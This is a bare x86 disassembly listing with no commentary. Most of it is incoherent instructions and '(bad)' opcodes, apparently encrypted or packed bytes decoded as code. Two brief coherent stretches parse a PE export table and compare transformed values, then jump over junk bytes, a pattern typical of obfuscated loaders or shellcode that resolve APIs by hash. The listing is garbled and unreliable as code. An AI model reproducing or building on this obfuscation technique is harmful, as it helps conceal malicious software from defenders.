  4030ae:	push   ecx
  4030af:	xor    al,dh
  4030b1:	icebp  
  4030b2:	ins    DWORD PTR es:[edi],dx
  4030b3:	sub    BYTE PTR [edx-0x13],bl
  4030b6:	fnsave [ecx-0x5031918f]
  4030bc:	push   ss
  4030bd:	mov    ah,0xb
  4030bf:	dec    edx
  4030c0:	jp     0x403090
  4030c2:	push   edi
  4030c3:	and    esp,ebp
  4030c5:	and    al,0x56
  4030c7:	mov    ds:0x289bbe82,al
  4030cc:	lods   al,BYTE PTR ds:[esi]
  4030cd:	inc    eax
  4030ce:	cmp    ecx,DWORD PTR [ebx]
  4030d0:	cmp    BYTE PTR [edi],ah
  4030d2:	cmp    BYTE PTR [eax+0x4c],dh
  4030d5:	cs cs cli 
  4030d8:	add    dl,0xc7
  4030db:	mov    ecx,0x23a48410
  4030e0:	fucomp st(6)
  4030e2:	pop    edi
  4030e3:	aam    0x70
  4030e5:	mov    eax,ds:0xb29b4ca7
  4030ea:	iret   
  4030eb:	call   0x550d:0x4b6ed23b
  4030f2:	mov    bl,BYTE PTR [ebp+0x3fd8ba48]
  4030f8:	and    al,0x5f
  4030fa:	sar    DWORD PTR [eax+0x60],cl
  4030fd:	adc    eax,0x9272dab7
  403102:	adc    eax,0x7413786a
  403107:	jo     0x4030f1
  403109:	test   eax,0x2ee7adab
  40310e:	inc    ebx
  40310f:	loop   0x4030d8
  403111:	mov    esi,0x98379b33
  403116:	mov    ch,0xcf
  403118:	push   ebp
  403119:	jmp    0xec68:0x9480a100
  403120:	sub    ebp,edi
  403122:	cdq    
  403123:	test   al,0x71
  403125:	inc    eax
  403126:	jle    0x4030bb
  403128:	sub    dl,BYTE PTR [edx-0x56]
  40312b:	lds    ecx,FWORD PTR [edi+ebx*2+0x66]
  40312f:	sub    al,0x90
  403131:	js     0x40317a
  403133:	fld    TBYTE PTR [eax+0x7c504852]
  403139:	mov    ebx,0xfb7b689e
  40313e:	sbb    ah,BYTE PTR [ebx]
  403140:	cdq    
  403141:	ss inc ebp
  403143:	daa    
  403144:	and    eax,0xd5ce632b
  403149:	dec    BYTE PTR [eax]
  40314b:	dec    esi
  40314c:	pop    ds
  40314d:	mov    cl,0xb
  40314f:	mov    esi,0x1b292379
  403154:	mov    ebx,0xde10fd93
  403159:	inc    ecx
  40315a:	xchg   ecx,eax
  40315b:	dec    ebx
  40315c:	pushf  
  40315d:	cli    
  40315e:	ret    
  40315f:	jmp    0x7d52:0x4f8efd13
  403166:	call   0x20dfcc90
  40316b:	xlat   BYTE PTR ds:[ebx]
  40316c:	iret   
  40316d:	and    cl,0x91
  403170:	sahf   
  403171:	mov    edx,0xdec91979
  403176:	xor    eax,ecx
  403178:	push   ss
  403179:	ins    BYTE PTR es:[edi],dx
  40317a:	(bad)  
  40317b:	and    edx,DWORD PTR [esi]
  40317d:	shl    BYTE PTR [ecx+0x5],1
  403180:	ja     0x403175
  403182:	push   ebx
  403183:	(bad)  
  403184:	out    dx,al
  403185:	mul    dl
  403187:	mov    esp,0xe50d4f08
  40318c:	int    0xf3
  40318e:	icebp  
  40318f:	jo     0x4031d3
  403191:	pop    edi
  403192:	clc    
  403193:	ins    BYTE PTR es:[edi],dx
  403194:	xor    al,0x3b
  403196:	xchg   esp,eax
  403197:	xor    BYTE PTR ds:[ebp+0x7c4a3551],0x81
  40319f:	cmp    eax,0xf4543e60
  4031a4:	imul   DWORD PTR [eax+0x22099ddd]
  4031aa:	sub    ch,BYTE PTR [eax+0x24]
  4031ad:	xchg   DWORD PTR [edx],ebx
  4031af:	jmp    0xcfa050b6
  4031b4:	push   ebx
  4031b5:	push   ebp
  4031b6:	pop    ss
  4031b7:	mov    esp,0x4c4418f6
  4031bc:	repnz rol DWORD PTR [eax],cl
  4031bf:	push   cs
  4031c0:	sbb    BYTE PTR [di],dh
  4031c3:	test   eax,edx
  4031c5:	mov    ebp,0x177e6a30
  4031ca:	sahf   
  4031cb:	or     esi,DWORD PTR [ebx-0x16]
  4031ce:	jo     0x403234
  4031d0:	inc    esi
  4031d1:	sbb    DWORD PTR [ecx-0x3331363b],ebx
  4031d7:	jns    0x4031bf
  4031d9:	loopne 0x40323a
  4031db:	push   eax
  4031dc:	mov    ch,0x1f
  4031de:	sbb    BYTE PTR [eax],dh
  4031e0:	pop    ebx
  4031e1:	mul    BYTE PTR [eax-0x56]
  4031e4:	mov    DWORD PTR [ecx+0x13],ebp
  4031e7:	sub    BYTE PTR [eax-0x2d9c3342],bh
  4031ed:	inc    edi
  4031ee:	pop    ebp
  4031ef:	call   0xf4eb:0xba719782
  4031f6:	in     al,dx
  4031f7:	push   eax
  4031f8:	pusha  
  4031f9:	arpl   WORD PTR [ebp+0x72],dx
  4031fc:	mov    ds:0x23ffb7b3,eax
  403201:	sbb    al,BYTE PTR es:[edx+0xb]
  403205:	jbe    0x403218
  403207:	fwait
  403208:	jge    0x4031b1
  40320a:	adc    eax,0x7d9c6ad7
  40320f:	popa   
  403210:	dec    ecx
  403211:	jle    0x40326d
  403213:	pop    ebx
  403214:	aaa    
  403215:	and    edi,ebp
  403217:	mov    ch,0xb3
  403219:	mov    esp,0x5fb77d28
  40321e:	sub    BYTE PTR [esi+edi*2],ah
  403221:	(bad)  
  403222:	and    eax,0x8a953c44
  403227:	in     al,0xeb
  403229:	loope  0x403209
  40322b:	sti    
  40322c:	addr16 xor dl,dh
  40322f:	loopne 0x4031d8
  403231:	xor    ecx,DWORD PTR [esi+0x53]
  403234:	pop    ebp
  403235:	push   ecx
  403236:	enter  0x9000,0x39
  40323a:	xor    BYTE PTR [edi],ah
  40323c:	(bad)  
  40323d:	pop    esp
  40323e:	adc    bh,cl
  403240:	sti    
  403241:	(bad)
  403244:	jae    0x403286
  403246:	pop    ebx
  403247:	pop    esi
  403248:	or     dh,BYTE PTR [ecx]
  40324a:	idiv   esi
  40324c:	xor    al,0x17
  40324e:	les    ebp,FWORD PTR [edx-0x4c]
  403251:	xlat   BYTE PTR ds:[ebx]
  403252:	(bad)  
  403253:	call   0xcadce786
  403258:	rol    ch,1
  40325a:	xchg   esi,eax
  40325b:	adc    DWORD PTR [ecx-0x6e],ecx
  40325e:	cmp    eax,0xb06205a2
  403263:	xchg   ebx,eax
  403264:	(bad)  
  403265:	loop   0x40321d
  403267:	jl     0x403277
  403269:	mov    cl,0x1b
  40326b:	jmp    0xe6833cf8
  403270:	leave  
  403271:	out    0xd5,eax
  403273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403274:	shl    DWORD PTR [esi-0x19b06496],cl
  40327a:	inc    ecx
  40327b:	dec    edx
  40327c:	xor    esp,DWORD PTR [ebx]
  40327e:	aam    0x0
  403280:	icebp  
  403281:	xchg   DWORD PTR [esi-0x5e],edi
  403284:	xor    bh,BYTE PTR ds:0x58cefa68
  40328a:	ins    DWORD PTR es:[edi],dx
  40328b:	sbb    ecx,DWORD PTR [ebx]
  40328d:	xor    edi,DWORD PTR [esi+edi*2-0x3f]
  403291:	fimul  DWORD PTR [edi-0x52]
  403294:	out    dx,eax
  403295:	mov    ebx,ebp
  403297:	inc    edx
  403298:	daa    
  403299:	mov    eax,ds:0xc3f71eed
  40329e:	in     al,dx
  40329f:	in     eax,0xf2
  4032a1:	out    dx,eax
  4032a2:	mov    ch,0xbd
  4032a4:	(bad)  
  4032a6:	cwde   
  4032a7:	imul   edx,DWORD PTR [ecx+0x23],0x27ef6a8d
  4032ae:	dec    ebp
  4032af:	add    BYTE PTR [edx+0x3d],ch
  4032b2:	ficom  DWORD PTR [esi+0x6d286a49]
  4032b8:	xor    al,bh
  4032ba:	sub    dh,BYTE PTR [ebx+0x70495a0d]
  4032c0:	pop    es
  4032c1:	add    eax,0xe6beaa4a
  4032c6:	scas   eax,DWORD PTR es:[edi]
  4032c7:	ja     0x40327a
  4032c9:	dec    ecx
  4032ca:	(bad)  
  4032cb:	shl    ah,cl
  4032cd:	cli    
  4032ce:	shl    BYTE PTR [esi+ecx*1+0x20],1
  4032d2:	enter  0x691,0x89
  4032d6:	scas   al,BYTE PTR es:[edi]
  4032d7:	cdq    
  4032d8:	xor    BYTE PTR ds:0x71593860,0x98
  4032df:	xchg   edi,eax
  4032e0:	loopne 0x4032fd
  4032e2:	ret    
  4032e3:	mov    bh,0x58
  4032e5:	in     eax,dx
  4032e6:	imul   ebx,DWORD PTR [edi-0x7a775561],0x38
  4032ed:	call   0x89199a56
  4032f2:	cmp    edx,DWORD PTR [ebx]
  4032f4:	mov    DWORD PTR [edx-0x63],edx
  4032f7:	gs inc ebp
  4032f9:	leave  
  4032fa:	fst    QWORD PTR [ebp-0x35ddac74]
  403300:	dec    ecx
  403301:	(bad)  
  403302:	mov    dh,0x23
  403304:	lock jbe 0x4032b3
  403307:	cmp    al,BYTE PTR [ecx]
  403309:	(bad)  
  40330a:	mov    dh,0xdb
  40330c:	adc    al,0x26
  40330e:	retf   0x7f
  403311:	loop   0x4032ca
  403313:	out    0xb0,eax
  403315:	mov    ecx,0xd9b3bb75
  40331a:	mov    al,ds:0x324e77ce
  40331f:	add    ebp,edi
  403321:	shr    DWORD PTR [ecx+edx*1-0x13],0x33
  403326:	mov    BYTE PTR [ebx],0xc7
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0x6e3dc34a]
  403372:	jl     0x40336e
  403374:	fcom   QWORD PTR [eax]
  403376:	sbb    bh,BYTE PTR [eax+0x78]
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x40336d
  40337e:	pop    edx
  40337f:	fnsave [ebx]
  403381:	ds jl  0x4033b1
  403384:	sbb    BYTE PTR [ebp+0x3c],0xf0
  403388:	xchg   esi,eax
  403389:	pop    DWORD PTR [esi+0x69]
  40338c:	inc    ebx
  40338d:	dec    esi
  40338e:	mov    dl,0x87
  403390:	and    DWORD PTR [ebp+0x37084a0f],ecx
  403396:	rol    DWORD PTR [ecx],0x46
  403399:	push   esp
  40339a:	and    bl,cl
  40339c:	mov    bl,0xe4
  40339e:	loopne 0x40333b
  4033a0:	inc    ebp
  4033a1:	or     al,0x7e
  4033a3:	ins    DWORD PTR es:[edi],dx
  4033a4:	cwde   
  4033a5:	or     edx,DWORD PTR [edx]
  4033a7:	dec    edx
  4033a8:	jne    0x403414
  4033aa:	lock sub al,0xe8
  4033ad:	sub    eax,0x5c78b36e
  4033b2:	sub    al,0xfe
  4033b4:	jecxz  0x403366
  4033b6:	mov    BYTE PTR [esp+edx*4-0x6e],ch
  4033ba:	gs mov edx,0x2d8cac8e
  4033c0:	popa   
  4033c1:	add    DWORD PTR [ebx-0x2968a1c1],edi
  4033c7:	sub    eax,0xb34f2c6b
  4033cc:	mov    ebp,0x7f354c72
  4033d1:	xchg   edx,eax
  4033d2:	cli    
  4033d3:	xor    ebx,DWORD PTR [edi]
  4033d5:	xchg   ebx,eax
  4033d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033d7:	aad    0xc8
  4033d9:	cmc    
  4033da:	pop    esp
  4033db:	mov    edx,0xc47dd551
  4033e0:	pop    ecx
  4033e1:	repnz mov ch,BYTE PTR [edi]
  4033e4:	mov    esp,DWORD PTR [ebx+0x55782ce1]
  4033ea:	arpl   WORD PTR [edx+ebp*2+0x56],ax
  4033ee:	mov    BYTE PTR [ebp+0x2a68bfe4],al
  4033f4:	push   0x27
  4033f6:	js     0x4033c5
  4033f8:	stc    
  4033f9:	mov    esi,0x2cea63b4
  4033fe:	xchg   edi,eax
  4033ff:	inc    edi
  403400:	mov    ch,0x95
  403402:	fistp  WORD PTR [ebp-0x4b]
  403405:	imul   ebx,DWORD PTR [esi+edx*4],0x4341e9cb
  40340c:	jo     0x40341c
  40340e:	dec    esi
  40340f:	mov    al,ds:0x7e79ae53
  403414:	lods   al,BYTE PTR ds:[esi]
  403415:	adc    eax,0xbbf92d4b
  40341a:	test   eax,0x3ba8f60e
  40341f:	adc    DWORD PTR [esi-0x39],ebx
  403422:	outs   dx,DWORD PTR ds:[esi]
  403423:	addr16 (bad) 
  403425:	sti    
  403426:	cwde   
  403427:	(bad)  
  403428:	inc    ecx
  403429:	cmp    al,0x2f
  40342b:	cwde   
  40342c:	cmp    BYTE PTR [esi-0x4e],dh
  40342f:	adc    al,0xcb
  403431:	push   edx
  403432:	jl     0x4033df
  403434:	push   es
  403435:	sub    al,0x84
  403437:	mov    ebp,0x99d4e704
  40343c:	ror    BYTE PTR [edx-0x62],cl
  40343f:	jno    0x4033e4
  403441:	daa    
  403442:	jnp    0x4033eb
  403444:	push   ebp
  403445:	or     BYTE PTR [edx-0x36],dl
  403448:	inc    ebx
  403449:	ds (bad) 
  40344b:	pop    ds
  40344c:	inc    esp
  40344d:	cmp    al,0x9f
  40344f:	xchg   ebp,eax
  403450:	adc    al,0xb7
  403452:	mov    al,ds:0x91eb6090
  403457:	mov    eax,ds:0xe0b3709c
  40345c:	in     al,0x2b
  40345e:	aam    0x9a
  403460:	fimul  DWORD PTR [eax+0x5c5c3160]
  403466:	icebp  
  403467:	(bad)  
  403469:	pop    ds
  40346a:	cmp    eax,0x41120613
  40346f:	in     eax,0x1b
  403471:	cwde   
  403472:	jmp    0x403412
  403474:	jge    0x40348b
  403476:	and    eax,0x1ed251b2
  40347b:	daa    
  40347c:	sub    BYTE PTR [ebp+0x7ad92f27],0xf5
  403483:	cmp    al,0xac
  403485:	loop   0x403448
  403487:	push   esi
  403488:	retf   0x163b
  40348b:	ss gs shl ah,1
  40348f:	fs int 0xa4
  403492:	aas    
  403493:	jne    0x40349e
  403495:	add    ah,BYTE PTR [edx+0x56ec6629]
  40349b:	dec    edi
  40349c:	jmp    0x403427
  40349e:	loopne 0x4034bb
  4034a0:	cli    
  4034a1:	sbb    BYTE PTR [ecx+0x6cc9d52b],dh
  4034a7:	xchg   ebx,eax
  4034a8:	shr    DWORD PTR [ecx-0x716f27de],cl
  4034ae:	mov    bl,0xe4
  4034b0:	leave  
  4034b1:	push   es
  4034b2:	mov    bl,0x4a
  4034b4:	add    al,0x99
  4034b6:	cdq    
  4034b7:	pop    edx
  4034b8:	shl    BYTE PTR [ebp-0x25dcd1da],1
  4034be:	mov    ds:0xad03dd40,eax
  4034c3:	or     DWORD PTR [edx+0x3],esp
  4034c6:	shr    BYTE PTR [eax-0x2b],0x8c
  4034ca:	jbe    0x4034ed
  4034cc:	es jno 0x403538
  4034cf:	aaa    
  4034d0:	sbb    edi,esi
  4034d2:	pop    es
  4034d3:	xor    al,bl
  4034d5:	and    eax,0xb276afa7
  4034da:	jno    0x403534
  4034dc:	xchg   edx,eax
  4034dd:	push   ecx
  4034de:	ret    
  4034df:	out    dx,al
  4034e0:	ficomp WORD PTR [edx]
  4034e2:	xchg   DWORD PTR ds:0x2bbe8117,edi
  4034e8:	jp     0x4034b1
  4034ea:	ficomp WORD PTR [ebx]
  4034ec:	cmp    BYTE PTR [eax-0x3c],ch
  4034ef:	sbb    ebx,eax
  4034f1:	(bad)  
  4034f2:	mov    ds:0x6a51fafe,eax
  4034f7:	cmp    edx,DWORD PTR [esi]
  4034f9:	pop    ebp
  4034fa:	and    al,0x5c
  4034fc:	or     ah,BYTE PTR [ecx]
  4034fe:	out    dx,eax
  4034ff:	dec    ecx
  403500:	outs   dx,DWORD PTR ds:[esi]
  403501:	jl     0x40357e
  403503:	push   0x36
  403505:	out    dx,eax
  403506:	inc    BYTE PTR ds:0x83543f58
  40350c:	test   eax,0x991a8d4c
  403511:	xchg   edi,eax
  403512:	stos   DWORD PTR es:[edi],eax
  403513:	pop    esi
  403514:	or     DWORD PTR [ebx],eax
  403516:	cmp    dl,dl
  403518:	push   edi
  403519:	jnp    0x4034fb
  40351b:	lds    edx,FWORD PTR [esi-0x142a4535]
  403521:	dec    eax
  403522:	cmc    
  403523:	sbb    eax,0xf0b30a7c
  403528:	xlat   BYTE PTR ds:[ebx]
  403529:	fist   WORD PTR [ecx]
  40352b:	inc    esi
  40352c:	mov    dl,0x4c
  40352e:	sub    bl,BYTE PTR [edx]
  403530:	out    dx,eax
  403531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403532:	ds and eax,0x65b791af
  403538:	ror    BYTE PTR [ebx-0x398d68bf],0x21
  40353f:	push   ss
  403540:	xchg   BYTE PTR [edx*8-0x5ced30f9],ah
  403547:	mov    dl,0x40
  403549:	hlt    
  40354a:	inc    eax
  40354b:	cmc    
  40354c:	adc    esi,DWORD PTR [ecx-0x17]
  40354f:	out    0x66,al
  403551:	pop    edx
  403552:	loope  0x403552
  403554:	repnz mov ch,0x1d
  403557:	inc    ebp
  403558:	pop    ebx
  403559:	in     al,0x46
  40355b:	lods   al,BYTE PTR ds:[esi]
  40355c:	dec    edx
  40355d:	jno    0x40357f
  40355f:	add    dl,BYTE PTR [eax-0x6e442d10]
  403565:	iret   
  403566:	scas   al,BYTE PTR es:[edi]
  403567:	adc    eax,0x8777ca28
  40356c:	xchg   edx,eax
  40356d:	inc    ebx
  40356e:	inc    ebx
  40356f:	adc    BYTE PTR [eax+0x3f4f879],al
  403575:	fldenv [ecx]
  403577:	sub    DWORD PTR [eax+eax*8-0x213b1ea7],esp
  40357e:	test   al,0x5
  403580:	and    eax,0x707b6e9e
  403585:	das    
  403586:	or     esp,DWORD PTR ds:0xdbf49273
  40358c:	cmp    al,0x3c
  40358e:	out    dx,al
  40358f:	les    ecx,FWORD PTR [edi+eax*2-0x336fae89]
  403596:	add    DWORD PTR [edi+esi*4-0x2851443b],esi
  40359d:	pop    ss
  40359e:	xchg   edi,eax
  40359f:	pmovmskb ebx,mm1
  4035a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035a3:	js     0x4035dd
  4035a5:	inc    ecx
  4035a6:	add    ah,0x99
  4035a9:	cmovbe ebx,DWORD PTR [edx]
  4035ac:	stc    
  4035ad:	xlat   BYTE PTR ds:[ebx]
  4035ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035af:	dec    esi
  4035b0:	jg     0x40361e
  4035b2:	test   esi,edi
  4035b4:	jmp    0x755:0x9ca14d3
  4035bb:	ret    
  4035bc:	sub    eax,0xaee3522
  4035c1:	xchg   ecx,eax
  4035c2:	iret   
  4035c3:	mov    dh,0xa3
  4035c5:	mov    dl,0x24
  4035c7:	push   esi
  4035c8:	adc    edi,ecx
  4035ca:	lods   al,BYTE PTR ds:[esi]
  4035cb:	mov    dl,0x89
  4035cd:	fstp   st(2)
  4035cf:	jp     0x403638
  4035d1:	outs   dx,DWORD PTR ds:[esi]
  4035d2:	not    DWORD PTR [esi+0x27]
  4035d5:	cmp    al,al
  4035d7:	(bad)  
  4035d8:	xchg   ebp,eax
  4035d9:	out    dx,al
  4035da:	jo     0x4035bf
  4035dc:	ja     0x403575
  4035de:	retf   
  4035df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e0:	icebp  
  4035e1:	and    eax,0x2a89a62c
  4035e6:	xor    bl,BYTE PTR [eax+0x762f592]
  4035ec:	ret    
  4035ed:	fmul   DWORD PTR [edi+0x3b11a98f]
  4035f3:	add    DWORD PTR [eax],eax
  4035f5:	imul   edx,DWORD PTR [ebp+0x7f],0x78
  4035f9:	and    esp,DWORD PTR [ebp+0x45]
  4035fc:	aaa    
  4035fd:	pop    ecx
  4035fe:	in     eax,dx
  4035ff:	xor    eax,esi
  403601:	add    eax,edi
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x6b5b4b5c,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x403648
  40363f:	aam    0xf4
  403641:	jns    0x4035ef
  403643:	lock xchg esi,eax
  403645:	test   ch,bh
  403647:	hlt    
  403648:	cmp    cl,BYTE PTR [edx-0x6a]
  40364b:	add    cl,cl
  40364d:	ins    DWORD PTR es:[edi],dx
  40364e:	in     al,dx
  40364f:	sbb    esp,edx
  403651:	ins    BYTE PTR es:[edi],dx
  403652:	push   ebp
  403653:	inc    ebx
  403654:	iret   
  403655:	jo     0x403647
  403657:	iret   
  403658:	mov    DWORD PTR [eax],edx
  40365a:	daa    
  40365b:	xchg   ebp,eax
  40365c:	pop    ss
  40365d:	add    eax,0x6ad082a7
  403662:	cmp    eax,0xa7518467
  403667:	inc    eax
  403668:	pop    esp
  403669:	jae    0x4036ad
  40366b:	sbb    eax,0x80cd7565
  403670:	sbb    esi,0xb5a9e9da
  403676:	pop    ecx
  403677:	clc    
  403678:	enter  0xe28d,0xbc
  40367c:	pop    eax
  40367d:	in     al,dx
  40367e:	cmp    eax,0x54668124
  403683:	scas   eax,DWORD PTR es:[edi]
  403684:	and    bl,ah
  403686:	pop    ss
  403687:	pop    ss
  403688:	sub    bh,0xe2
  40368b:	xchg   edi,eax
  40368c:	or     bl,BYTE PTR [ebp-0x707e98d]
  403692:	dec    ebp
  403693:	addr16 push ebp
  403695:	jbe    0x4036e3
  403697:	in     eax,0xb0
  403699:	sbb    BYTE PTR [edx+0x35b240cd],bl
  40369f:	xchg   ebx,eax
  4036a0:	fld    QWORD PTR [edx]
  4036a2:	inc    esp
  4036a3:	jp     0x4036ff
  4036a5:	adc    BYTE PTR [eax],al
  4036a7:	les    esi,FWORD PTR [ebp-0x13]
  4036aa:	test   al,0x94
  4036ac:	mov    dl,0xb7
  4036ae:	and    eax,eax
  4036b0:	pushf  
  4036b1:	iret   
  4036b2:	add    bl,BYTE PTR [edi+0x7b]
  4036b5:	iret   
  4036b6:	sti    
  4036b7:	or     ebx,eax
  4036b9:	inc    eax
  4036ba:	pushf  
  4036bb:	into   
  4036bc:	xor    bh,BYTE PTR [ebx+0xc]
  4036bf:	inc    ebx
  4036c0:	retf   
  4036c1:	xchg   ebx,eax
  4036c2:	loop   0x4036dd
  4036c4:	xchg   ebx,eax
  4036c5:	div    DWORD PTR [ebx+eiz*8-0x626c6b4e]
  4036cc:	shr    BYTE PTR [edi-0x687c6849],cl
  4036d2:	fist   DWORD PTR [edi]
  4036d4:	jb     0x403723
  4036d6:	dec    ecx
  4036d7:	lds    ebp,FWORD PTR [ebp-0x7965a27b]
  4036dd:	aaa    
  4036de:	xor    BYTE PTR [eax+ebx*4-0x852a7ca],dh
  4036e5:	adc    ch,BYTE PTR [eax]
  4036e7:	inc    ebp
  4036e8:	scas   al,BYTE PTR es:[edi]
  4036e9:	push   eax
  4036ea:	push   es
  4036eb:	adc    ah,BYTE PTR [eax+ebp*4]
  4036ee:	and    dh,BYTE PTR [edx+0x27f2a3a3]
  4036f4:	fwait
  4036f5:	data16 add bl,BYTE PTR [edx-0x40e31765]
  4036fc:	ror    BYTE PTR [esp+ebx*4+0x6cbaa58],cl
  403703:	xor    al,0xc1
  403705:	mov    edi,0xe6592a75
  40370a:	fisttp DWORD PTR [edi+0x58fe3868]
  403710:	mov    al,0x88
  403712:	xchg   ecx,eax
  403713:	out    dx,al
  403714:	imul   eax,DWORD PTR [edx-0x73],0x99efabc8
  40371b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40371c:	mov    cl,0xc0
  40371e:	add    al,0x25
  403720:	test   eax,0xfbdaa0da
  403725:	retf   
  403726:	and    dl,BYTE PTR [ebx+0x35]
  403729:	nop    DWORD PTR ds:0x4787a175
  403730:	push   0xffffff92
  403732:	dec    edi
  403733:	les    esi,FWORD PTR [edx-0x39]
  403736:	dec    ebx
  403737:	inc    eax
  403738:	cli    
  403739:	stos   BYTE PTR es:[edi],al
  40373a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40373b:	and    dl,BYTE PTR [ecx]
  40373d:	aaa    
  40373e:	inc    esp
  40373f:	(bad)  
  403741:	fs mov dl,al
  403744:	jge    0x40379f
  403746:	cmc    
  403747:	dec    eax
  403748:	mov    eax,ds:0x1a2fe363
  40374d:	inc    ebp
  40374e:	xchg   ebp,eax
  40374f:	ror    BYTE PTR [ebx+0x721fd3c1],1
  403755:	cmp    eax,0xfd53aaae
  40375a:	and    BYTE PTR [bx+0x29],bl
  40375e:	mov    ecx,0xc4a7ff20
  403763:	xor    DWORD PTR [esi-0x2dea85e2],0x26
  40376a:	bound  edx,QWORD PTR [ebp-0x72d764c1]
  403770:	sub    al,0x6f
  403772:	pop    ds
  403773:	pop    esi
  403774:	loope  0x403742
  403776:	add    dh,BYTE PTR [esi+0x3c37f083]
  40377c:	or     al,0x4f
  40377e:	mov    edi,0x5cb6acce
  403783:	sbb    al,0xf6
  403785:	sub    BYTE PTR [ebx-0x6e],0xf8
  403789:	bound  esp,QWORD PTR [ebp+0x19320ee4]
  40378f:	inc    esi
  403790:	inc    DWORD PTR [ebp+0x75a5ddef]
  403796:	dec    esi
  403797:	mov    ebx,0xfc676dd5
  40379c:	scas   eax,DWORD PTR es:[edi]
  40379d:	pop    eax
  40379e:	adc    esp,0xe1dc198c
  4037a4:	repz inc ebp
  4037a6:	mov    esi,0xb0b9cfc8
  4037ab:	scas   al,BYTE PTR es:[edi]
  4037ac:	lock std 
  4037ae:	pusha  
  4037af:	fldcw  WORD PTR [ebx+0x5e]
  4037b2:	test   dh,bh
  4037b4:	adc    eax,0xbbd0f968
  4037b9:	wbinvd 
  4037bb:	add    esp,DWORD PTR [esi-0x7e]
  4037be:	in     eax,0x3b
  4037c0:	jg     0x4037d4
  4037c2:	sbb    eax,0x2899f276
  4037c7:	push   es
  4037c8:	jno    0x403819
  4037ca:	outs   dx,DWORD PTR ds:[esi]
  4037cb:	jne    0x40381d
  4037cd:	xchg   esi,eax
  4037ce:	cmp    DWORD PTR [edi],edi
  4037d0:	adc    eax,DWORD PTR [edx]
  4037d2:	sbb    al,0x4a
  4037d4:	imul   eax,DWORD PTR [ebp-0x17786201],0xe373f97
  4037de:	push   ebx
  4037df:	mov    edx,0xc30b580d
  4037e4:	or     dh,bl
  4037e6:	mov    esi,0xb3e3bc71
  4037eb:	mov    ch,BYTE PTR [ebx+0x6c]
  4037ee:	imul   ebp,DWORD PTR [edx],0x1b
  4037f1:	(bad)  
  4037f2:	and    bp,cx
  4037f5:	cmp    al,0x3a
  4037f7:	out    0xd,al
  4037f9:	out    dx,al
  4037fa:	or     ebx,0x8b995935
  403800:	push   ss
  403801:	in     eax,dx
  403802:	fwait
  403803:	sub    DWORD PTR [ebp+0x21],ebx
  403806:	add    ecx,ebx
  403808:	fstp   QWORD PTR [ebp-0x548232dd]
  40380e:	and    cl,BYTE PTR [ebx-0x410cc873]
  403814:	sbb    al,0xc5
  403816:	mov    al,0x0
  403818:	sbb    eax,0xdb11f2ba
  40381d:	xor    ah,BYTE PTR [ebp+0x34]
  403820:	push   0x68fcaa68
  403825:	mov    ecx,0x732c5461
  40382a:	fs jno 0x403829
  40382d:	cmp    al,0x46
  40382f:	nop
  403830:	cs jg  0x403865
  403833:	push   ebp
  403834:	dec    eax
  403835:	out    0x7c,eax
  403837:	les    eax,FWORD PTR [edx-0x67]
  40383a:	enter  0x903a,0xae
  40383e:	mov    cl,0x87
  403840:	sbb    eax,DWORD PTR [edx]
  403842:	cmp    al,0x63
  403844:	mov    bh,0xab
  403846:	imul   edx,DWORD PTR [ecx-0x39],0xffffffcf
  40384a:	cmp    ecx,ecx
  40384c:	sbb    al,0x91
  40384e:	out    dx,al
  40384f:	xor    DWORD PTR [eax+0x6aadf3d6],eax
  403855:	add    cl,BYTE PTR [edi-0x1902cdf6]
  40385b:	mov    ecx,0x6674ce70
  403860:	inc    edi
  403861:	sbb    BYTE PTR [eax],cl
  403863:	lods   al,BYTE PTR ds:[esi]
  403864:	in     al,0x5d
  403866:	jp     0x4038cc
  403868:	iret   
  403869:	fisub  DWORD PTR [edi-0x641d102a]
  40386f:	jmp    0x403827
  403871:	or     BYTE PTR [eax+0x2d],ch
  403874:	rcr    DWORD PTR [ebx-0x71],0x28
  403878:	mov    ds:0x1c1d7bff,al
  40387d:	(bad)  
  40387e:	shl    BYTE PTR [eax],0x49
  403881:	mov    esi,0x4e44048c
  403886:	and    DWORD PTR [ecx-0x7f],esi
  403889:	and    cl,BYTE PTR [ebx+0x29]
